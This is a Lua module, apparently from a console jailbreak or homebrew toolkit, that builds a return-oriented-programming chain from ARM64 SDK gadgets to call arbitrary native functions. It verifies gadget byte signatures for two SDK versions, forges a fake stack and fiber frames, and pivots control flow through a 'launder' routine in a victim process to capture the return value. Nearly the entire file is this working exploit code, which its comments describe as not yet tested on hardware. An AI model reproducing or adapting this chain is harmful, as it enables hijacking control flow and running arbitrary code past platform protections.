-- Candidate <=8-GP native-call bridge with scalar x0 return. NOT universal:
-- no FP/SIMD arguments, stack arguments, hidden x8 struct returns, or
-- non-x0 return classes. SAME-INVOCATION SDK fiber switch.
--
-- This is NOT enabled by normal boot. The exact SDK instructions have been
-- checked in Ghidra and the frame is checked by offline tests, but hardware
-- has NOT yet run a synthetic-stack call. Use only for an opt-in benign
-- scalar oracle until the full round trip is observed on console.
--
-- BC_FUNCC -> jffi thunk -> launder(ctrl): x0=&saved_sp, x1=&fake_sp
-- -> sdk+fiber_switch: saves CURRENT live SP/registers to saved_sp, loads
--    F=fake_sp and ret to pop_gp on heap-backed fake stack
-- -> pop_gp: x0..x7 from fake stack; ret to capture
-- -> capture: blr x22=target; str x0,[x19+0x10] (full 64-bit result)
-- -> pop_gp again: x0=&fake_sp, x1=&saved_sp; ret to fiber_switch
-- -> fiber_switch restores the live *same invocation* launder frame;
--    ret to launder+0x2c, which zeros BC_FUNCC result count and returns.
-- No saved SP from a previous coroutine/invocation is used.
local jffi = require("bl.jffi")
local M = {}

M.layout = { RESULT = 0x10, SAVED = 0x120, FAKE = 0x128,
             FAKE_FRAME_SIZE = 0xf0, ROP1 = 0x50, ROP2 = 0x80,
             STACK_SIZE = 0x20100 }

-- Complete consumed instruction ranges, not first-instruction prefixes.
-- In particular, the final SP restore/RET of fiber_switch and pop_gp must
-- match or a positive preflight would still enter a non-returning chain.
local SIGNATURE = {
    fiber_switch  = "ffc303d1020080d2e24f00a9f45701a9f65f02a9f86703a9fa6f04a9fc7705a9fe0b06a9e8a703adeaaf04adecb705adeebf06ade2030091020000f9220040f95f000091e04f40a9f45741a9f65f42a9f86743a9fa6f44a9fc7745a9fe3340f9e8a743adeaaf44adecb745adeebf46adffc30391c0035fd6",
    fiber_pop_gp  = "e00740a9e20f41a9e41742a9e61f43a9fd7b44a9ff4301911f2003d5c0035fd6",
    -- Two known capture variants: blr x22 (1.0.1f) and blr x21 (1.0.1o).
    -- Both are checked; exactly one must match the image.
    fiber_capture_x22 = "c0023fd6600a00f9f44f42a9f65741a9fd7bc3a8c0035fd6",
    fiber_capture_x21 = "a0023fd6600a00f9f44f42a9f65741a9fd7bc3a8c0035fd6",
    -- Two known launder compilations; the instruction order differs but the
    -- functional contract (x1 from ctrl+0x38, callee from ctrl+0x48, x0 from
    -- ctrl+0x50, blr, zero return, restore) is identical.
    launder_v1    = "fd7bbea9f30b00f9fd030091a00100b4011c40f9f30300aa410100b4682640f9080100b4602a40f900013fd6e0031f2a7f1e00f9f30b40f9fd7bc2a8c0035fd6",
    launder_v2    = "fd7bbea9f30b00f9fd030091011c40f9f30300aa810100b4682640f9480100b4602a40f900013fd6e0031f2a7f1e00f9f30b40f9fd7bc2a8c0035fd620008012",
    thunk_ptr     = "000c40f90207805203018052080040f9040d40f980001fd6",
}

-- One persistent arena per VM. Allocating a 128 KiB fake stack plus a control
-- block on EVERY native call produced megabytes of cdata garbage per second
-- once sockets were polled each frame, and every allocation is a chance for a
-- GC step to land inside the gclist borrow window in bl.jffi. construct()
-- rewrites each frame word below, so reuse carries no stale state.
local arena = nil

local function reserve(ffi)
    if not arena then
        arena = { ctrl = jffi.ctrl(ffi, 0x200),
                  stack = ffi.new("uint8_t[?]", M.layout.STACK_SIZE) }
    end
    return arena
end

local function p64(ffi, addr)
    return ffi.cast("uint64_t*", ffi.cast("uintptr_t", addr))
end

local function word(ffi, v)
    local kind = type(v)
    if kind == "number" then
        if v % 1 ~= 0 or math.abs(v) > 9007199254740991 then
            error("native argument is not an exact 64-bit integer")
        end
    elseif kind == "cdata" then
        -- Reject SCALAR FP types, not pointers/arrays whose referent happens
        -- to be float/double: a float* is an ordinary GP pointer in xN.
        if ffi.istype("float", v) or ffi.istype("double", v) or
           ffi.istype("long double", v) or ffi.istype("complex float", v) or
           ffi.istype("complex double", v) then
            error("floating-point scalar arguments need a different ABI bridge")
        end
    else
        error("native argument must be integer or pointer cdata")
    end
    local ok, result = pcall(ffi.cast, "uint64_t", v)
    if not ok then error("cannot cast native argument to uint64_t") end
    return result
end

function M.preflight(ffi, info)
    if not (info and info.sdk_base and info.off) then return nil, "unresolved SDK" end
    local function check_bytes(rva, expected)
        local p = ffi.cast("const uint8_t*", ffi.cast("uintptr_t", info.sdk_base + rva))
        local got = {}
        for i = 0, #expected / 2 - 1 do
            got[#got + 1] = ("%02x"):format(tonumber(p[i]))
        end
        return table.concat(got) == expected
    end
    -- Check non-variant signatures first.
    for key, expected in pairs(SIGNATURE) do
        if key:find("^fiber_capture") or key:find("^launder_v") then goto continue end
        local rva = info.off[key]
        if not rva then return nil, "missing SDK offset " .. key end
        if not check_bytes(rva, expected) then return nil, "wrong SDK bytes at " .. key end
        ::continue::
    end
    -- Launder: two known compilations, one must match at the launder offset.
    local ldr_rva = info.off.launder
    if not ldr_rva then return nil, "missing SDK offset launder" end
    if not (check_bytes(ldr_rva, SIGNATURE.launder_v1 or "") or
            check_bytes(ldr_rva, SIGNATURE.launder_v2 or "")) then
        return nil, "wrong SDK bytes at launder"
    end
    -- Capture gadget: two known variants (blr x22 and blr x21). Exactly one
    -- must match at the fiber_capture offset.
    local cap_rva = info.off.fiber_capture
    if not cap_rva then return nil, "missing SDK offset fiber_capture" end
    local cap_p = ffi.cast("const uint8_t*", ffi.cast("uintptr_t", info.sdk_base + cap_rva))
    local cap_matched = false
    for _, cap_key in ipairs({"fiber_capture_x22", "fiber_capture_x21"}) do
        local expected = SIGNATURE[cap_key]
        if expected then
            local got = {}
            for i = 0, #expected / 2 - 1 do
                got[#got + 1] = ("%02x"):format(tonumber(cap_p[i]))
            end
            if table.concat(got) == expected then cap_matched = true; break end
        end
    end
    if not cap_matched then return nil, "wrong SDK bytes at fiber_capture" end
    return true
end

function M.construct(ffi, info, target, args)
    args = args or {}
    assert(type(args) == "table" and #args <= 8, "at most eight GP arguments")
    local sdk, off, L = info.sdk_base, info.off, M.layout
    local target_word = word(ffi, target)
    assert(target_word ~= 0, "null native callee")
    local held = reserve(ffi)
    local ctrl, stack = held.ctrl, held.stack
    local raw = tonumber(ffi.cast("uintptr_t", stack))
    local P = raw + 0x10000 + (16 - raw % 16) % 16  -- fake SP, 64 KiB headroom
    local F = P - L.FAKE_FRAME_SIZE                -- fiber frame: SP=F on entry
    local function put(addr, v) p64(ffi, addr)[0] = word(ffi, v) end

    -- Fake fiber frame consumed by DispatchFiberContext's LDPs. x19 keeps
    -- the control pointer across the native call.
    put(F + 0x08, ctrl.addr)               -- x19
    put(F + 0x58, F)                       -- x29 (diagnostics only)
    put(F + 0x60, sdk + off.fiber_pop_gp)  -- x30, first gadget

    -- The capture gadget was recompiled between SDK versions:
    --   1.0.1f: blr x22; frame=0x18, target from fiber frame +0x20 (x22)
    --   1.0.1o: blr x21; frame=0x30, target from capture frame [sp+0x18] (x21)
    -- Detect which by reading the first instruction at capture:
    local cap_word = tonumber(ffi.cast("const uint32_t*",
        ffi.cast("uintptr_t", sdk + off.fiber_capture))[0])
    local cap_uses_x21 = (cap_word == 0xd63f02a0)  -- blr x21
    local cap_uses_x22 = (cap_word == 0xd63f02c0)  -- blr x22
    assert(cap_uses_x21 or cap_uses_x22,
           ("unrecognised capture gadget: %08x"):format(cap_word))

    if cap_uses_x22 then
        put(F + 0x20, target_word)         -- x22 in fiber frame
    else
        put(F + 0x18, target_word)         -- x21 in fiber frame
    end

    -- pop_gp loads eight 64-bit arguments from [P] and returns to capture.
    for i = 0, 7 do put(P + i * 8, (args[i + 1] == nil) and 0 or args[i + 1]) end
    put(P + 0x40, F)
    put(P + 0x48, sdk + off.fiber_capture)

    -- Capture gadget's synthetic frame. It stores x0 at ctrl+RESULT, then
    -- pops its saved registers and returns to a second pop_gp.
    if cap_uses_x21 then
        -- 1.0.1o: ldp x20,x19,[sp,#0x20]; ldp x22,x21,[sp,#0x10]; ldp x29,x30,[sp],#0x30
        put(P + 0x50, F)                       -- x29
        put(P + 0x58, sdk + off.fiber_pop_gp)  -- x30
        put(P + 0x60, 0)                       -- x22
        put(P + 0x68, target_word)             -- x21 (the target!)
        put(P + 0x70, 0)                       -- x20
        put(P + 0x78, ctrl.addr)               -- x19
    else
        -- 1.0.1f: ldp x20,x19,[sp,#0x10]; ldp x22,x21,[sp]; ldp x29,x30,[sp],#0x18
        put(P + 0x50, F)                       -- x29 (slot in [sp] for 0x18 frame)
        put(P + 0x58, sdk + off.fiber_pop_gp)  -- x30
        put(P + 0x60, target_word)             -- x22 (discarded by the next pop)
        put(P + 0x68, 0)                       -- x21
        put(P + 0x70, 0)                       -- x20
        put(P + 0x78, ctrl.addr)               -- x19
    end

    -- pop_gp again loads the two context-slot addresses, then jumps into
    -- fiber_switch which saves the fake frame and restores the live one.
    put(P + 0x80, ctrl.addr + L.FAKE)
    put(P + 0x88, ctrl.addr + L.SAVED)
    for i = 2, 7 do put(P + 0x80 + i * 8, 0) end
    put(P + 0xc0, F)
    put(P + 0xc8, sdk + off.fiber_switch)

    ctrl.u64(0)[0] = ctrl.addr + 0x80
    ctrl.u64(0x80 + jffi.VT_CALLEE)[0] = sdk + off.launder
    ctrl.u64(off.launder_arg1)[0] = ctrl.addr + L.FAKE  -- nonzero x1
    ctrl.u64(off.launder_callee)[0] = sdk + off.fiber_switch
    ctrl.u64(off.launder_arg0)[0] = ctrl.addr + L.SAVED
    ctrl.u64(L.SAVED)[0] = 0                  -- filled by FIRST switch
    ctrl.u64(L.FAKE)[0] = F                  -- input to first switch
    ctrl.u64(L.RESULT)[0] = 0xdeadbeefULL   -- overwritten by capture
    return { ctrl = ctrl, stack = stack, fake_frame = F, fake_sp = P }
end

function M.invoke(ffi, victim, info, target, args, inspect)
    local ok, why = M.preflight(ffi, info)
    if not ok then return nil, why end
    local setup = M.construct(ffi, info, target, args)
    -- Optional main-thread diagnostic: observe the ACTUAL frame words while
    -- still intact, before the second fiber switch overwrites the fake stack.
    -- An inspector error declines before making any native call.
    if inspect then
        local observed, reason = pcall(inspect, setup)
        if not observed then return nil, "frame inspection failed: " .. tostring(reason) end
    end
    local result, err = jffi.call_ptr(ffi, victim,
                                       info.sdk_base + info.off.thunk_ptr,
                                       setup.ctrl)
    if not result then return nil, err end
    if result.ret ~= 0 then return nil, "BC_FUNCC returned a nonzero result count" end
    local L = M.layout
    if setup.ctrl.u64(L.SAVED)[0] == 0 or
       setup.ctrl.u64(L.FAKE)[0] == setup.fake_frame then
        return nil, "fiber switches did not complete"
    end
    local raw = setup.ctrl.u64(L.RESULT)[0]
    return { raw = raw, int32 = ffi.cast("int32_t", raw),
             int64 = ffi.cast("int64_t", raw) }
end

return M
